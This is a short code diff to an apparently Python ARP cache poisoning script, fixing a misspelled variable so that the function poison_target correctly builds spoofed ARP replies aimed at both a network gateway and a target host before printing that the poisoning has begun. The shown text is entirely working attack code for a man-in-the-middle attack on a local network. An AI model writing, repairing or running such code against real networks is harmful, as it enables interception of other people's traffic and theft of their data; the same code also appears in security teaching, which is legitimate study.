@@ -33,10 +33,10 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     poison_target.hwdst = target_mac
 
     poison_gateway = ARP()
-    poison_gatway.op = 2
-    poison_gatway.psrc = target_ip
-    poison_gatway.pdst = gateway_ip
-    poison_gatway.hwdst = gateway_mac
+    poison_gateway.op = 2
+    poison_gateway.psrc = target_ip
+    poison_gateway.pdst = gateway_ip
+    poison_gateway.hwdst = gateway_mac
 
     print("[*] Beginning the ARP poison. [Ctrl-C to stop]")
 
